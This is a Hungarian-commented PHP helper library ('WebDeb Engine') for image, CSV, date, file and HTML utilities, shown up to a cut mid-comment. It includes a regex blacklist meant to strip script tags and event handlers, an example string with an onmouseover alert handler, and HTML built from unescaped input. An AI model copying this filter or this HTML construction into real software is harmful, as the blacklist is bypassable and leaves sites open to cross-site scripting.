<?php
//WebDeb Engine v2.7 2016.06.10
/*

__autoload()                Osztályok automatikus meghívása
a_az()                      Névelő a vagy az legyen
adatbazis2tomb()            Ha egy adatbázis kapcsolat egy oszlopából szeretnék egy tömbök készíteni, hogy azt be tudjuk járni vagy implode-olni
atlatszo_kep_atmeretez()    Átlétszó kép átméretezése úgy, hogy megmaradjon az átméretezés
base64_csonkit()            A base64_encode-al kapott sztring gyakran egyenlőségjelre végződik, ami nagyon árulkodó. Ezt eltávolítjuk.
biztonsagos_html()          Kiszűri a nembiztonságos html kódokat
byte_konvertal()            Bájtokat kiírja szépen, ha kell ugrik egy mértékegységet is
csonkit()                   Egy stringet ad vissza a megadott számú karakterrel rövidebben. Tipikusan SQL utasítások generálása után hasznos
css_img_data()              Egy CSS tartalomból kiválogatja a képelemeket és azokatból DATA-URI-t készít
csv_ellenorzes_frissit()    CSV feldogozáskor az adatok előkészítése feltöltéshez
csv_ellenorzes_letolt()     CSV feldogozáskor az adatok előkészítése letöltéshez
cron()                      Ez a függvény minden lapletöltésnél meghívódik, de magát a lefuttatandó srcipteket a cron fájlban kell beállítani (pl. valami.php|60*60*24|2000-01-01 12:00:00) Részletek a Tudásbázisban.
date2int()                  Egy dátumot (Y-m-d H:i:s)-t intre alakít: a Unix Epoch (1970 Január 1. 00:00:00 GMT) és az adott idő közt eltelt másodpercek száma
date_formaz()               Egy dátumot (Y-m-d H:i:s)-t elegánsan jelenít meg, hónapokkal kiírva
din_list()                  Dinamikus lista
dupla_szokoz_mentesit()     Egy stringben belüli dupla szóközöket cseréli le szipla szóközökre. pl.: 'a   a' => 'a a' 
fajlba_mentes()             Egy megadott szöveget kiír a megadott fájlba
fajlbol_olvas()             Az útvonalon megadott fájl tartalmát olvassa be (sablonok beolvaássa)
fajlmeret_formaz()          Egy bájtokban megkapott fájlméretet ír ki szépen, a mértékegységeket figyelembe véve => filesize2()-nél elég az útvonalat megadni
fajlnev_keszit()            Egy átlagos szóból mappa/fájlnevet készít
fajlnev_sorszamoz()         Egy fájlnév ha létezik (foglalt), akkor készítünk egy másolatot. Pl: fajlnev.jpg => fajlnev_1.jpg
fordit_string()             A megadott stringet megfordítja
get_encoding()              Megállapítja egy stringről, hogy milyen kódolású (pl. utf-8)
get_get()                   Get változókat adja vissza
get_get_order()             get_get() egy változata első sorban adminhoz (Az order értéket beállítja, még akkor is ha nem volt)
hd()                        header('Location:') procedúrában segítség
hupper()                    Egy szó KEZDŐ betűjét nagybetűssé alakítja, magyar ékezet és UFT-8 kompatibilis (összes nagybetűsítés css-ből => class="up")
html_img_data()             Egy HTML tartalomból kiválogatja a képelemeket és azokatból DATA-URI-t készít
html_javit()                Egy HTML tartalomat kijavít (pl. bezáratlan HTML tag-eket)
htmlspecialchars_decode2()  htmlspecialchars_decode() helyett
i_u()                       => átkerült a fuggvenyek.php-ba
iconv2()                    Saját iconv függvény: speciális karakterekből html kódot készít pl.: © => &copy;
is_valid_mail()             Ellenőrzi, hogy az e-mail cím megfelelő formátumú-e
is_valid_mail_tobb()        Ha egy e-mail mezőben több e-mail cím is szerepel, akkor annak a mezőnek az ellenőrzése.
jelszot_keszit()            Véletlenszerű jelszót generál megadott hosszból, megadott karakterekből
kep_forgat()                Kép elforgatása megadott fokkal.
kep_kiir()                  Szokásos képkiíratás, hogy ne kelljen 1000-szer lerni ugyanazt Pl.: $kep = kep_kiir(get_utvonal().'valami.jpg', 'címe', get_indexkep_sz(), get_indexkep_m(), 'b', 'margin: 0', '', 'termek.php?id=1');
kep_torol()                 Törli a képet és minden egyes thumbnailját
kit()                       Egy fájl kiterjesztését adja vissza pont NÉLKÜL
konyvtar_bejar()            Könyvtár rekurzív bejárása, az útvonalakat egy tömbbel adja vissza
ksz2sql()                   Kulcsszó => SQL Adott kulcsszóból egy olyan SQL-t gyárt, ami a megadott oszlopokban keres, részrekre bontva a kulcsszót. Az SQL lekérezés részlet zárójelbe csomagolt.
kulcs_rendez()              Többdimenziós tömb rendezése egy megadott kulcs alapján. 
level_kuldes()              Általános levélküldő függvény
level_kuldes_osszetettebb() Ez ahhoz kell, hogy lehessen másolatot, rejtett másolatot is címezni. Sőt még levélpapírt is tud kezelni.
logot_pecsetel()            Logót vagy bármilyen képet pecsétel egy másik képre.
mail_img2cid()              class.Mail kiegésztése, ezzel lehet megoldani azt, hogy a levél képei a HTML-be ágyazva jelenjenek meg.
mail_rejtes()               E-mail cím rejtése a HTML kódban. pl: mail_rejtes("<a style='font-size: 11px' onmouseover='alert(\'df\')' href='mailto:bk@webdeb.hu'>küldj üzenentet</a>");
minify_css()                CSS egysorosítása illetve konvertálása CSS3-ra
nevnap()                    Megadja az adott nap névnapját (ho|nap)
nl2()                       Feleleges szóközöket kiveszi. Ha a tartalom egy részét szertnénk megjeleníteni, feleslegesen vannak benne a formázások.
nl2br2()                    nl2br() rendesen
notags()                    Kiszűri a <tag>-eket még akkor is ha speciális karakterrel lettek feltöltve
utf8_substr()               UTF-8 szavakra értelmezett substr
utf8()                      Bemeneti striget UTF-8-á alakít, ha nem volna alapból az
pretty_url_decode()         Pretty URL-ben kapott változót visszaalkítja pl. ID-vá  (pl. valami_p_valami2 => valami/valami2)
pretty_url_encode()         ID átalakítása pretty URL-é (mentesíteni a per jelektől) (pl. valami/valami2 => valami_p_valami2)
remover()                   adott útvonallal kezdődő fálokat letörli
resz_string()               Rész string, szóköznél vágja el a kapott sztringet (hogy ne egy szó kellős közepét vágjuk el)
round_5()                   5 HUF-ra kerekít
sablon_gyar()               Sablont készít a megadott sablonfájlból, és az opcionálisan megadható $mit, $mivel-ből
self()                      A $_SERVER["PHP_SELF"]-et adja vissza, de így rövidebb
self_sablon_nev()           Sablonkezelésnél jön jól, ha a sablon.html-jét a php fájl nevéből akarjuk kinyertni pl. elerhetoseg.php =>  elerhetoseg.html
sql_dump()                  SQL teljes kimentése
sql_ertek()                 SQL injection ellen az értékeket átvizsgálja, és kiszűri a gyanúsakat
string2html()               Előformázott szöveg konvertálása HTML-é (Wikipédia mintájára)
szukites()                  A tábla egy oszlopára készít egy 'distinct select'-et amivel szűkíthetjük a találatokat (Admin)
thumbnail_kep_e()           A megadott fájlnév thumbnail alakú-e vagy sem? Átméretezett fényképeket ismeri fel a "_{SZ}x{M}" alak alapján
tomb2option()               Egy adatbázisból kapott tömbből készítünk úgy egy option listát, hogy a függvény beállítja a selected értéket is
URL_letolt()                Egy URL tartalmát megnyitja, letölti (curl-t használ hozzá). A sima fopen() vagy file() fügvények általában nem működnek.
web_ftp()                   Fájlfeltöltésre
webdeb_stat()               Ezzel mutatható ki, hogy adott projekt hány fájlból, sorból, karakterből áll... Egy kis érdekesség
zip_becsomagol()            ZIP fájlba csomagolás
zip_kicsomagol()            ZIP fájlból csomagolás
*/

require_once 'fuggvenyek.php';
/**
*	Autoload - osztályoknál a hiányzó osztálokat automatikusan meghívja
*/
function __autoload($class_name){
	require_once 'class/class.'.$class_name.'.php';
}

/**
* @desc Átlászó kép átméretezése
*
* @param $kep   image Kép adat
* @param $szel  int   A kívánt szélesség
* @param $magas int   A kívánt magasság
* @param $magas int   A kívánt magasság
* 
* @return image adat
*/
function atlatszo_kep_atmeretez( $kep, $szel, $magas ){
	$akt_szel   = imagesx($kep);
	$akt_magas  = imagesy($kep);
	$uj_kep     = imagecreatetruecolor($szel, $magas);
	
	imagealphablending($uj_kep, false);
	imagesavealpha($uj_kep, true);
	$transparent = imagecolorallocatealpha($uj_kep, 255, 255, 255, 127);
	imagefilledrectangle($uj_kep, 0, 0, $szel, $magas, $transparent);
	imagecopyresampled($uj_kep, $kep, 0, 0, 0, 0, $szel, $magas, $akt_szel, $akt_magas);
	
	return $uj_kep;
}

/** 
* @desc 'a' vagy 'az' kerüljön a szó elé 
* @param $szo string, a szó ami elé a névelő kerül
* @param $nagybetus boolean, kis van nagybetűs
* 
* @return string: 'a' vagy 'az'

*/
function a_az($szo, $nagybetus = false){
    
    $mgnhangzok = array('ö', 'ü', 'ó', 'e', 'u', 'i', 'o', 'ő', 'ú', 'a', 'é', 'á', 'ű', 'í',
                        'Ö', 'Ü', 'Ó', 'E', 'U', 'I', 'O', 'Ő', 'Ú', 'A', 'É', 'Á', 'Ű', 'Í');
                        
    $elso = substr($szo, 0, 1);
    
    if(in_array($elso, $mgnhangzok)){
        if($nagybetus){
            return 'Az';
        } else {
            return 'az';
        }
        
    } else {
        if($nagybetus){
            return 'A';
        } else {
            return 'a';
        }
    }
    
}

/** 
* @desc Ha egy adatbázis kapcsolat egy oszlopából szeretnék egy tömbök készíteni, hogy azt be tudjuk járni vagy implode-olni
* @param $adatb_tomb array: az adatbázis kapcsolattal lekérdezett összetett tömb
* @param $oszlop string: amely oszlop értékeit össze szeretnénk gyűjteni
* 
* @return array: egy tömb, benne az értékekkel

*/
function adatbazis2tomb($adatb_tomb, $oszlop){
    $tomb = array();
    foreach($adatb_tomb as $tomb_akt_elem){
        array_push($tomb, $tomb_akt_elem[$oszlop]);
    }
    return $tomb;
}


/**
* @desc A base64_encode-al kapott sztring gyakran egyenlőségjelre végződik, ami nagyon árulkodó. Ezt eltávolítjuk.
* 
* @param  string $string A base64-es string
* @return string A csonkított string
*/
function base64_csonkit($string){
    while( substr($string, strlen($string)-1,1)=='=' ){
        $string = substr($string, 0, strlen($string)-1);
    }
    return $string;
}


/**
* @desc A base64_encode továbbfejlesztett változata, amely már garantáltan nem egyenlőség jelre végződik
* 
* @param  string $string A string, amit el szeretnénk kódolni
* @return string A kódolt szöveg
*/
function base64_encode2($string){
    return base64_csonkit( base64_encode($string) );
}

/**
* @desc Biztonságos HTML - kiszűri a nembiztonságos tegeket 
* pl. adatbázisba mentéskor érdemes lefuttatni. Hasonlít a strip_tags() függvényhez, de itt az alap html tegek engedélyezve vannak
* 
* @param  string $szoveg A megszűrendő szöveg
* @return string A megszűrt szöveg
*/
function biztonsagos_html($szoveg){
    
    $gyanus = array(
    '/<iframe(.*?)<\/iframe>/is',
    '/<title(.*?)<\/title>/is',
    '/<frame(.*?)<\/frame>/is',
    '/<frameset(.*?)<\/frameset>/is',
    '/<object(.*?)<\/object>/is',
    '/<'.str_replace('#', '', 's#cript').'(.*?)<\/script>/is',
    '/<embed(.*?)<\/embed>/is',
    '/<applet(.*?)<\/applet>/is',
    '/<meta(.*?)>/is',
    '/<!doctype(.*?)>/is',
    '/<link(.*?)>/is',
    '/<body(.*?)>/is',
    '/<\/body>/is',
    '/<head(.*?)>/is',
    '/<\/head>/is',    
	'/javasript"(.*?)"/is',
    '/vbscri?pt"(.*?)"/is',
    '/onabort="(.*?)"/is',     '/onabort=&quot;(.*?)&quot;/is',     "/onabort='(.*?)'/is",     '/onabort=/is',
    '/onblur="(.*?)"/is',      '/onblur=&quot;(.*?)&quot;/is',      "/onblur='(.*?)'/is",      '/onblur=/is',
    '/onchange="(.*?)"/is',    '/onchange=&quot;(.*?)&quot;/is',    "/onchange='(.*?)'/is",    '/onchange=/is',
    '/onfocus="(.*?)"/is',     '/onfocus=&quot;(.*?)&quot;/is',     "/onfocus='(.*?)'/is",     '/onfocus=/is',
    '/onmouseout="(.*?)"/is',  '/onmouseout=&quot;(.*?)&quot;/is',  "/onmouseout='(.*?)'/is",  '/onmouseout=/is',
    '/onmouseover="(.*?)"/is', '/onmouseover=&quot;(.*?)&quot;/is', "/onmouseover='(.*?)'/is", '/onmouseover=/is',
    '/onload="(.*?)"/is',      '/onload=&quot;(.*?)&quot;/is',      "/onload='(.*?)'/is",      '/onload=/is',
    '/onreset="(.*?)"/is',     '/onreset=&quot;(.*?)&quot;/is',     "/onreset='(.*?)'/is",     '/onreset=/is',
    '/onselect="(.*?)"/is',    '/onselect=&quot;(.*?)&quot;/is',    "/onselect='(.*?)'/is",    '/onselect=/is',
    '/onsubmit="(.*?)"/is',    '/onsubmit=&quot;(.*?)&quot;/is',    "/onsubmit='(.*?)'/is",    '/onsubmit=/is',
    '/onunload="(.*?)"/is',    '/onunload=&quot;(.*?)&quot;/is',    "/onunload='(.*?)'/is",    '/onunload=/is',
    '/onerror="(.*?)"/is',     '/onerror=&quot;(.*?)&quot;/is',     "/onerror='(.*?)'/is",     '/onerror=/is',
    '/onclick="(.*?)"/is',     '/onclick=&quot;(.*?)&quot;/is',     "/onclick='(.*?)'/is",     '/onclick=/is',
    '/<html(.*?)>/is',
    '/<\/html>/is');
    
    return  preg_replace($gyanus, '', $szoveg);
    
}

/**
* Bájtokat kiírja szépen, ha kell ugrik egy mértékegységet is
* 
* @param  int $bytes A bájtok összege
* @return string A megformázott bájtok
*/
function byte_konvertal($bytes){
    
    $size = $bytes / 1024;
    if($size < 1024){
        
        $size = number_format($size, 2);
        $size .= ' KB';
        
    } else {
        
        if($size / 1024 < 1024){
            
            $size = number_format($size / 1024, 2);
            $size .= ' MB';
        
        }elseif($size / 1024 / 1024 < 1024){
            
            $size = number_format($size / 1024 / 1024, 2);
            $size .= ' GB';
        }
    }
    return $size;
}

/**
*	Csonkít
*	
*	@param string $string: string, amit a végén cson kítunk
*	@param int $mennyit: hány karaktert szedjünk le a végéből
*
*	@return string: a csonkított string
*/
function csonkit($string,$mennyit){
	return substr($string,0,strlen($string)-$mennyit);
}


/**
 * Egy CSS tartalomból kiválogatja a képelemeket és azokból DATA-URI-t készít
 * 
 *	@param string $html: a CSS, melyben képet keresünk
 *
 *	@return string: Az átkonvertált tartalom
 * 
 */
if (!function_exists('mime_content_type')) {
    require_once('class/html/mime.php');
}
function css_img_data($css){
    
    $mit   = array();
    $mivel = array();
    preg_match_all("/url\((\"|'|)?((.*\.(png|gif|jpg))(\"|'|))\)/Ui", $css, $talalatok);
    foreach($talalatok[0] as $elem){

        $elem = str_replace(array('url(\'../', '\')'), array('', ''), $elem);
        //Ha nem létezne a fájl rápróbálunk még egy könyvtárral fentebb
        if(!is_file($elem)){
            $elem = '../'.$elem;
        }
        
        if(is_file($elem)){
            $imageData = base64_encode( file_get_contents( $elem ) );
            $data_uri  = 'data:'.mime_content_type($elem).';base64,'.$imageData;

            array_push($mit,   ' url(\'../'.$elem);
            array_push($mivel, '/*'.$elem.'*/ url(\''.$data_uri);
        }

    }
    
    return str_replace($mit, $mivel, $css);
}

/**
*   CSV feldolgozásnál az egyes értékeket ellenőrizni kell. Trimmeljük, az idézőjeles és újsor problémát is szűrjük.
*   @param string A stringként kapott érték
*
*   @return string Az ellenőrzött érték
*/
function csv_ellenorzes_frissit($string){
    $string = trim($string);
    $string = str_replace(array('<br>', '<br />'), array("\r\n", "\r\n"), $string);
    return $string;
}

/**
*   CSV feldolgozásnál az egyes értékeket ellenőrizni kell. Trimmeljük, az idézőjeles és újsor problémát is szűrjük.
*   @param string A stringként kapott érték
*
*   @return string Az ellenőrzött érték
*/
/**
*   CSV feldolgozásnál az egyes értékeket ellenőrizni kell. Trimmeljük, az idézőjeles és újsor problémát is szűrjük.
*   @param string A stringként kapott érték
*
*   @return string Az ellenőrzött érték
*/
function csv_ellenorzes_letolt($string, $idezojel_szur = '', $nullas_betu_egyenlo_nelkul = ''){
    
    //Ha ékezetes nagy betűvel kezdődött egy szó, valami miatt lemaradt, ezért minden szót ezzel kezdek.
    $string = nl2br2( htmlspecialchars_decode( trim($string) ) );
    $kell_egyenlo = false;
    if(!$nullas_betu_egyenlo_nelkul){
        if(is_numeric($string) && substr($string, 0, 1)=='0'){
            $kell_egyenlo = true;
        }
    }
    //Idézőjel lekezelése
    if(strstr($string, '"')){
        if($idezojel_szur){
            $string = str_replace('"', '', $string);
        } else {
            $string = str_replace('"', '""', $string);
        }
    }
    
    //Az a biztos, ha mindig idézőjel közé tesszük (nem csak ha pontosvessző is van közte) az egyéb speciális karakterek miatt
    $string = '"'.$string.'"';
    if($kell_egyenlo){
        $string = '='.$string;
    }
    
    return $string;
}

/**
*	CRON
*	Ez a függvény minden lapletöltésnél meghívódik, de magát a lefuttatandó srcipteket a cron.txt fájlban kell beállítani Részletek a Tudásbázisban.
*   Fájl szerkezete:
*   valami.php|gyakoriság másodperccel leírva (pl. 60*60*24)|utolsó lefutás dátuma (opcionális)
*/
function cron(){

    if(is_file('cron.txt')){
        $url_ek = '';
        $uj_fajl = '';
        $tartalom = fajlbol_olvas('cron.txt');

        
        $sorok = explode("\n", $tartalom);
        foreach($sorok as $sor){

            $sor = trim($sor);

            list($php_fajl, $gyakorisag, $utolso_ido) = explode('|', trim($sor));
            $php_fajl   = trim($php_fajl);
            $gyakorisag = trim($gyakorisag);
            $utolso_ido = trim($utolso_ido);

            //Ha korábban nem találtuk, azért még próbáljuk meg újból
            $php_fajl = str_replace('NEM_TALALHATO!_', '', $php_fajl);
            
            //Gyakoriság felszorzása (lehet 60*60*2-foromátumban van megadva)
            $szorzat = 1;
            $szorzok = explode('*', $gyakorisag);
            foreach($szorzok as $szam){
                $szorzat *= $szam;
            }
            
            //Ha nincs utolsó időpont megadva, akkor elsőre futtassuk le
            if($utolso_ido){
                $utolso_ido = date2int( $utolso_ido);
            } else {
                $utolso_ido = time()-$szorzat-1;
            }
            
            if($php_fajl){

                if(substr($sor, 0, 2)=='//'){
                    
                    $uj_fajl .= $sor."\n";
                    
                } else {
                    
                    list($alap_fajl, $getek) = explode('?', $php_fajl);
                    if(is_file($alap_fajl)){
                        if($utolso_ido+$szorzat<time()){

                            $url_ek .= htmlspecialchars($php_fajl).'|cron_szep|';

                            //Mi az új dátum? Ha nagyon régi dátum szerepel benne, akkor nem elég szorzattal növeln az időopntot. Adddig kell növelni, míg az aktuális pillanat és az új dátum közötti különbség kisebb nem lesz a szorzattól.
                            //Megtehetnénk, hogy simán beírjuk a mai dátumot, de így folyamatosan elcsúszna a cron lefutási ideje.
                            while( time()-$utolso_ido+$szorzat > $szorzat ){
                                $utolso_ido += $szorzat;
                            }
                            $uj_fajl .= $php_fajl.'|'.$gyakorisag.'|'.date('Y-m-d H:i:s', $utolso_ido-$szorzat)."\n";

                        } else {
                            $uj_fajl .= $sor."\n";
                        }
                    } else {
                        $uj_fajl .= 'NEM_TALALHATO!_'.$php_fajl.'|'.$gyakorisag.'|'.date('Y-m-d H:i:s', $utolso_ido)."\n";

                    }
                }

            } else {
                //$uj_fajl .= "\n";
            }
        }

        if($tartalom!=$uj_fajl){
            fajlba_mentes('cron.txt', $uj_fajl);
        }
        return $url_ek;
    }
    
}

/**
*	Date => integer
*	A Unix Epoch (1970 Január 1. 00:00:00 GMT) és az adott idő közt eltelt másodpercek száma. 
*	Ez megadható egy date() függvénynek ami vissza konvertálja.
*	mktime()-t függvény az alapja
*
*	@param string $datum: (Y-m-d H:i:s) alakú
*
*	@return integer: eltelt másodpercek
*/
function date2int($datum){
	list($ev,$ho,$nap,$ora,$perc,$sec) = explode('-', $datum);
	list($nap, $ora, $perc, $sec)      = explode(' ', $nap);
	list($ora, $perc, $sec)            = explode(':', $ora);
    if(!$ora){
        $ora = 12;
    }
	return mktime($ora, $perc, $sec, $ho, $nap, $ev);
}

/**
*	Dátum formázó
*
*	@param string $datum: (Y-m-d H:i:s) alakú, ezt alakítja elegánsabbá hónapokkal
*	@param bool $angol: ha igaz, akkor angol nyelven és formátumban írja ki a dátumot
*
*	@return string: a formázott kimenet
*/
function date_formaz($datum, $nyelv = ''){
    
    if($nyelv=='en'){
        
        $honap = array('', 'January', 'February', 'March', 'April', 'May', 'June', 'July', 'August', 'September', 'October', 'November', 'December');
        list($ev, $ho, $nap) = explode('-', $datum);
        list($nap)           = explode(' ', $nap);
        
        return (int)$nap.' '.$honap[(int)$ho].' '.$ev;
        
    }elseif($nyelv=='de'){

        $honap = array('', 'Januar', 'Februar', 'März', 'April', 'Mai', 'Juni', 'Juli', 'August', 'September', 'Oktober', 'November', 'Dezember');
        list($ev, $ho, $nap) = explode('-', $datum);
        list($nap)           = explode(' ', $nap);
        
        return (int)$nap.' '.$honap[(int)$ho].' '.$ev;
        
    } else {
        
        $honap = array('','január','február','március','április','május','június','július','augusztus','szeptember','október','november','december');
        list($ev, $ho, $nap) = explode('-', $datum);
        list($nap)           = explode(' ', $nap);
        
        return $ev.'. '.$honap[(int)$ho].' '.(int)$nap.'.';
        
    }
    
}

/**
*	Dinamikus Lista
*
*	@param string $tabla melyik táblában keressen (előtag nélkül)
*	@param string $oszlop a tábla mely oszlopát szűkítse
*	@param string $inputnev az input neve lesz így lehet több dl is egy oldalon (tömb 'name' értékéből származtatjuk) illetve a rejtett input kap egy input neve_hidden nevet
*	@param string $php_fajl A dl.php fájl elérhetősége. Probléma, hogy az admin és a rendes web más-más helyről kell, hogy hivatkozza a js fájlt.
*	@param string $value Az input mező értéke
*	@param bool   $id_kell Ha nem kell az id, akkor a hidden input nevét átnevezi mezonev_hidden-nek, így nem definiálja felül a látható input nevét (pl. admin oldalon egy termék id érdekel bennünket nem a neve, tehát ott kell az id)
*	@param string $onclickre_aktiv Hogy hívjuk meg a DL-t: Enterre vagy rákattintásra egyből ugorjuk is a bejegyzésre vagy csak kerüljön be a szöveg az inputba
*	@param string $default Mi legyen a mező alapértelmezett értéke
*	@param string $placeholder Placeholder értéke 
*
*	@return string Az dl-hez szükséges HTML kód
*/
function din_list($tabla, $oszlop, $inputnev, $php_fajl, $value = '', $id_kell = true, $onclickre_aktiv = 0, $default = '', $placeholder = ''){
    if($id_kell){
    	$return = '<input class="normal" type="text" name="'.$inputnev.'" id="'.$inputnev.'" value="'.$value.'" placeholder="'.$placeholder.'" onkeyup="ajax_showOptions(this,\'szukit\',event,\''.$tabla.'\',\''.$oszlop.'\',\''.$php_fajl.'\',\''.$onclickre_aktiv.'\')" onfocus="this.setAttribute( \'autocomplete\', \'off\' ); if(this.value==\''.$default.'\'){ this.value=\'\'; }" onblur="if(this.value==\'\'){ this.value=\''.$default.'\'; }" style="width: 12rem" /><input type="hidden" id="'.$inputnev.'_hidden" name="'.$inputnev.'" />';
    	$return .= '<'.str_replace('#', '', 's#cript').' type="text/javascript">$(\'#'.$inputnev.'\').attr(\'autocomplete\', \'off\');</script>';
    } else {
    	$return = '<input class="normal" type="text" name="'.$inputnev.'" id="'.$inputnev.'" value="'.$value.'" placeholder="'.$placeholder.'" onkeyup="ajax_showOptions(this,\'szukit\',event,\''.$tabla.'\',\''.$oszlop.'\',\''.$php_fajl.'\',\''.$onclickre_aktiv.'\')" onfocus="this.setAttribute( \'autocomplete\', \'off\' ); if(this.value==\''.$default.'\'){ this.value=\'\'; }" onblur="if(this.value==\'\'){ this.value=\''.$default.'\'; }" style="width: 12rem" /><input type="hidden" id="'.$inputnev.'_hidden" name="'.$inputnev.'_hidden" />';
    	$return .= '<'.str_replace('#', '', 's#cript').' type="text/javascript">$(\'#'.$inputnev.'\').attr(\'autocomplete\', \'off\');</script>';
    }
	return $return;
}

/**
*	Dupla szóköz mentesítés - egy stringben található dupla szóközöket sziplára cseréli
*
*	@param string $string - az esetlegesen duplaszóközöket tartalmazó string
*
*	@return string A már csak szipla szóközöket tartalmazó string
*/
function dupla_szokoz_mentesit($string){
	while(substr_count($string,'  ')>0){
		$string = str_replace('  ', ' ', $string);
	}
	return $string;
}

/**
*	Kimenti az iratokat egy fajlba (pl. szálítólevél, proforma számlához jó)
*
*	@param string $utvonal: mentés útvonala pl.: 'szamlak/1.html'
*	@param string $tartalom: kiíratandó tartalom
*
*	@return string: (hibaüzenet) vagy semmi
*/
function fajlba_mentes($utvonal, $tartalom) {
    if (!$handle = @fopen($utvonal, 'w+')) {
	     return 'A(z) '.$utvonal.' fájl létrehozása nem sikerült!';
	}
	
	if (fwrite($handle, $tartalom) === FALSE) {
	    return 'Nem sikerült írni a(z) '.$utvonal.' fájlba!';
	}
	fclose($handle);
	
	return;
}

/**
*	Fájl beolvasása (text alapú fájl)
*	@param string  $path:    a fájlnév elérési útvonallal
*	@param boolean $tomorit: Ha igaz, akkor a felesleges karaktereket kiszűri (whitespaces)
*	@param boolean $data_uri: Ha igaz, akkor a html-ből kiszendi a képeket és data URI-ként menti le
*	@param boolean $komment_szur: Ha igaz, akkor a //-el kezdődő sorokat kiszűri (előtte trimmeli). Így a JS minify már megoldható egész soros megjegyzések esetén.
*
*	@return string: a fájl tartalma
*/
function fajlbol_olvas($path, $tomorit = false, $data_uri = false, $komment_szur = false){

    if( $tomorit ) {

        //A cache könyvtárban alkönyvtárakat is létrehozunk ha még nem léteznének (így pl többnyelűsítéskor nincs felülírás)
        $mit     = array('sablon/', '../'); //A sablon könyvtárat illetve a ../-t ki ki kell venni az elérési útvonalból
        $mivel   = array('',        '');
	    $utvonal = str_replace($mit, $mivel, $path);
	    
	    $konyvtarak = explode('/', $utvonal);
        $db = count($konyvtarak);
	    $akt_utvonal = get_utvonal().'cache/';
	    $i = 0;
        foreach($konyvtarak as $konyvtar){
	        if($konyvtar!='..' && $i<$db-1){
                $akt_utvonal .= $konyvtar.'/';

                if( !is_dir($akt_utvonal) ) {
                    mkdir($akt_utvonal);
                }
            }
            $i++;
        }

        //Ha létezik már cache fájl, és annak keletkezési dátuma nagyobb az eredeti JS fájltól, akkor csak beolvassuk
        if( file_exists(get_utvonal().'cache/'.$utvonal) && filemtime($path) < filemtime(get_utvonal().'cache/'.$utvonal) ){
            $ret = fajlbol_olvas(get_utvonal().'cache/'.$utvonal);
            
        //Egyébként vagy nem létezett, vagy ha létezett, de újabb az eredeti JS, akkor újraolvassuk, tömörítjük
        } else {

            unlink(get_utvonal().'cache/'.$utvonal);
            $handle = @fopen($path, "r");
            $ret = fread($handle, filesize($path));
            fclose($handle);

            //Ha ki kell szűrni a megjegyzéseket
            if($komment_szur){
                $ret_komment_nelkul = '';
                $sorok = explode("\r", $ret);
                foreach ($sorok as $sor){
                    $sor = trim($sor);
                    if(substr($sor, 0, 2)!='//'){
                        $ret_komment_nelkul .= $sor;
                    }
                }
                $ret = $ret_komment_nelkul;
            }

            $ret = preg_replace('/\s+/', ' ', $ret);
            $ret = str_replace(array(' <a', '</a> ', ' <b', '</b> ', ' <strong', '</strong> ', ' <span', '</span> '), array('&nbsp2;<a', '</a>&nbsp2;', '&nbsp2;<b', '</b>&nbsp2;', '&nbsp2;<strong', '</strong>&nbsp2;', '&nbsp2;<span', '</span>&nbsp2;'), $ret);
            $ret = str_replace(array('> ', ' <', '&nbsp2;'), array('>', '<', ' '), $ret);
            $ret = preg_replace("/<!--.*?-->/ms", '', $ret);
            $ret = preg_replace('!/\*.*?\*/!s',   '', $ret);

            if($data_uri){
                $ret = html_img_data($ret);
            }

            fajlba_mentes(get_utvonal().'cache/'.$utvonal, $ret);

        }
        
	} else {
	    
	    if(is_file($path) && filesize($path)){
        	$handle = @fopen($path, "r");
        	$ret = fread($handle, filesize($path));
            
            if($data_uri){
                $ret = html_img_data($ret);
            }
            
        	fclose($handle);
        }
    }
	return $ret;
}

/**
*	Fájlméret formázó
*	Egy bájtokban megkapott fájlméretet ír ki szépen, a mértékegységeket figyelembe véve
*/
function fajlmeret_formaz($meret, $tortresz = 2) {
    $meretek = array('B', 'kB', 'MB', 'GB', 'TB', 'PB', 'EB', 'ZB', 'YB');
    for ($i=0; $meret > 1024 && $i < count($meretek) - 1; $i++) $meret /= 1024;
    return round($meret,$tortresz).' '.$meretek[$i];
}

/** Filesize2
 *  @desc a fajlmeret_kiir() függvény-t hívja meg. filesize2() esetén nem egy szám értéket adunk meg, 
 *  hanem annak a fájlnak az elérési útvonalát, amelynek a méretére kíváncsiak vagyunk
 *
 *  @param int $utvonal A fájl rlérési útvonala
 *  @param int $tizedesek Hány tizedesjegyet írjon ki tört értéknél
 *
 *  @return string a formázott fájlméret 
 */
function filesize2($utvonal, $tizedesek = 2){
    if(is_file($utvonal)){
        return fajlmeret_formaz( filesize($utvonal), $tizedesek);
    }
}

/**
*	Fájlnevet készít
*	A kapott sztinet átalakítja olyanra, hogy ne tartalmazzon ékezeteket, speciális karaktereket
*	
*	@param string $string: amit feldolgoz
*
*	@return array: a lecsupaszított név
*/
function fk($string){
    return fajlnev_keszit($string);
}
function fajlnev_keszit($string, $ekezet_marad = false){
	
	$mit   = array( "'", '"', '`', '”', '„', '.', ',', ' ' );
	$mivel = array( '',  '',  '',  '',  '', '',  '',  '-' );
	
    if(!$ekezet_marad){
        array_push($mit,   'í', 'Í', 'á', 'Á', 'é', 'É', 'ö', 'Ö', 'ü', 'Ü', 'ó', 'Ó', 'ő', 'Ő', 'ú', 'Ú', 'ű', 'Ű');
        array_push($mivel, 'i', 'i', 'a', 'a', 'e', 'e', 'o', 'o', 'u', 'u', 'o', 'o', 'o', 'o', 'u', 'u', 'u', 'u');
    }
    
	$string = strip_tags(htmlspecialchars_decode2($string));
	$string = str_replace($mit, $mivel, $string);
	
	// És most UTF-8 helyett ANSI-val is cseréljük le
	$i = 0;
	foreach($mit as $betu){
        $betu = iconv('UTF-8', 'ISO-8859-2', $betu);
        $mit[$i] = $betu;
        $i++;
    }
    
	$string = str_replace($mit, $mivel, $string);
	
	if(strrpos($string,'.')){
		$kit    = mb_strtolower( mb_substr($string, mb_strrpos($string,'.'), mb_strlen($string)) );	// Elmentjük a kiterjesztést ha van
		$string = mb_strtolower( mb_substr($string, 0, mb_strrpos($string,'.')) );                  // Levesszük a kiterjesztést ha van
	} else {
		$kit    = '';                           // Nincs kiterjesztés
		$string = mb_strtolower( $string );     // Levesszük a kiterjesztést ha van
	}
	
    if(!$ekezet_marad){
        $string = preg_replace('/[^a-zA-Z0-9_-]/','',$string);
    }
	if(!$string){
		$string = 'noname';
	}
    
    // A fájl neve ne tartalmazzon még véletlen sem dupla "--"-et, mert az adatbázisba íráskor gondot fog okozni
    while(strpos($string, '--')!==false){
        $string = str_replace('--', '-', $string);
    }
	
	return $string.$kit;
}


/**
